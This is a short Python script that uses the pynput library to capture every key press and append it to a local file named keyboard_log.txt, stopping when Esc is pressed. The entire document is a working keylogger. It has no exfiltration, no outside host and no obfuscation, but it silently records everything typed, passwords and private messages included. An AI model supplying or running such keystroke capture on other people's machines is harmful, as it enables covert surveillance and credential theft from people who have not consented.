from pynput import keyboard

def on_press(key):
    try:
        data = str(key.char)
    except AttributeError:
        data = str(key)
        if data=="Key.space":
            data = " "
        elif data == "Key.enter":
            data = "\n"
        elif data == "Key.tab":
            data = "    "

    with open('keyboard_log.txt', 'a') as f:
        f.write(data)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()